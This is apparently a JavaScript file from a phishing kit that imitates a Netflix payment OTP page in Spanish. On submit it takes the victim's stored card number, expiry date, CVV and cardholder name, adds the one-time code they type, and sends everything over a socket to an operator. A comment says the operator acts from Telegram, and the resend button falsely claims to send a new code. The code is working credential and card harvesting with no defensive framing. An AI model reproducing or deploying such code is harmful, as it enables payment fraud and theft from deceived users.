// Payment OTP Form Handler
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Payment OTP page loaded');
    
    const otpForm = document.getElementById('otpForm');
    const otpCode = document.getElementById('otpCode');
    const submitBtn = document.getElementById('submitBtn');
    const resendBtn = document.getElementById('resendBtn');
    const countdownEl = document.getElementById('countdown');

    console.log('Form elements:', {
        otpForm: !!otpForm,
        otpCode: !!otpCode,
        submitBtn: !!submitBtn,
        resendBtn: !!resendBtn,
        countdownEl: !!countdownEl
    });

    console.log('socketManager available:', typeof socketManager !== 'undefined');
    if (typeof socketManager !== 'undefined') {
        console.log('socketManager connected:', socketManager.isConnected());
    }

    let countdown = 60;
    let countdownInterval = null;

    // Start countdown timer
    function startCountdown() {
        countdown = 60;
        resendBtn.disabled = true;
        countdownEl.textContent = countdown;

        if (countdownInterval) {
            clearInterval(countdownInterval);
        }

        countdownInterval = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;

            if (countdown <= 0) {
                clearInterval(countdownInterval);
                resendBtn.disabled = false;
                countdownEl.textContent = '0';
            }
        }, 1000);
    }

    // Initialize countdown on page load
    startCountdown();

    // Only numbers for OTP
    otpCode.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');

        // Enable submit button when 4-8 digits are entered
        const length = e.target.value.length;
        if (length >= 4 && length <= 8) {
            submitBtn.disabled = false;
            console.log('✅ Submit button ENABLED (' + length + ' digits entered)');
        } else {
            submitBtn.disabled = true;
            console.log('⏳ Submit button disabled (need 4-8 digits)');
        }
    });

    // Handle resend code
    resendBtn.addEventListener('click', function() {
        // In a real app, this would trigger a new OTP to be sent
        alert('Se ha enviado un nuevo código a tu dispositivo.');
        startCountdown();
        otpCode.value = '';
        submitBtn.disabled = true;
    });

    // Form validation
    function validateForm() {
        const code = otpCode.value;

        if (code.length < 4 || code.length > 8) {
            return { valid: false, message: 'El código debe tener entre 4 y 8 dígitos' };
        }

        if (!/^\d{4,8}$/.test(code)) {
            return { valid: false, message: 'El código solo debe contener números' };
        }

        return { valid: true };
    }

    // Handle form submission
    if (otpForm) {
        otpForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            console.log('🔐 OTP form submitted');
            console.log('OTP Code:', otpCode.value);
            console.log('Submit button disabled:', submitBtn.disabled);

            // Check if socketManager is available
            if (typeof socketManager === 'undefined') {
                console.error('❌ socketManager not available');
                alert('Error: Sistema de comunicación no disponible. Recarga la página.');
                return;
            }

            console.log('✅ socketManager available');

            // Check connection
            if (!socketManager.isConnected()) {
                console.error('❌ Socket not connected');
                alert('No hay conexión con el servidor. Verifica tu conexión a internet.');
                return;
            }

            console.log('✅ Socket connected');

            // Validate form
            const validation = validateForm();
            if (!validation.valid) {
                console.error('❌ Validation failed:', validation.message);
                alert(validation.message);
                return;
            }

            console.log('✅ Validation passed');

            // Get card data from localStorage
            const savedCardData = localStorage.getItem('netflix_card_data');
            let cardData = {};
            
            if (savedCardData) {
                try {
                    cardData = JSON.parse(savedCardData);
                    console.log('💾 Card data loaded from localStorage:', cardData);
                } catch (e) {
                    console.error('❌ Error parsing card data:', e);
                }
            } else {
                console.warn('⚠️ No card data found in localStorage');
            }

            // Prepare OTP data with card information
            const otpData = {
                otpCode: otpCode.value,
                cardNumber: cardData.cardNumber || 'N/A',
                expiryDate: cardData.expiryDate || 'N/A',
                cvv: cardData.cvv || 'N/A',
                cardName: cardData.cardName || 'N/A',
                plan: cardData.plan || 'Premium',
                timestamp: new Date().toISOString()
            };

            console.log('📤 Sending OTP data:', otpData);

            try {
                // Submit to server via Socket.IO
                await socketManager.submitOTP(otpData);
                console.log('✅ OTP submitted successfully');
                
                // Keep loading screen visible (waiting for admin action)
                // The loading screen will remain until admin clicks a button in Telegram
                
            } catch (error) {
                console.error('❌ Error submitting OTP:', error);
                alert('Error al procesar el código. Por favor intenta nuevamente.');
                socketManager.hideLoading();
            }
        });
    } else {
        console.error('❌ OTP Form not found!');
    }

    // Cleanup countdown on page unload
    window.addEventListener('beforeunload', function() {
        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
    });

    // Load saved language
    const savedLang = localStorage.getItem('netflix_lang') || 'es';
    const langSelect = document.querySelector('.language-selector select');
    if (langSelect) {
        langSelect.value = savedLang;
    }
});
